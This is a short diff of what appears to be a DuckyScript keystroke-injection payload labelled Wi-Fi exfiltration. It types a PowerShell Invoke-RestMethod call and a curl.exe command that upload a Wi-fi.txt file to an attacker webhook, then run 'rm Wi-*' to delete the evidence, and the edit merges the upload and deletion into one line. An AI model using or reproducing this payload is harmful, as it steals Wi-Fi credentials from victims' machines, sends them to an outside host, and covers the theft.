@@ -20,10 +20,7 @@ DELAY 500
 STRING Invoke-RestMethod -ContentType "Application/Json" -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
 ENTER
 DELAY 500
-STRING curl.exe -F "file1=@Wi-fi.txt" $webhook
-ENTER
-DELAY 500
-STRING rm Wi-*
+STRING curl.exe -F "file1=@Wi-fi.txt" $webhook; rm Wi-*
 ENTER
 DELAY 500
 REM END OF WIFI EXFIL
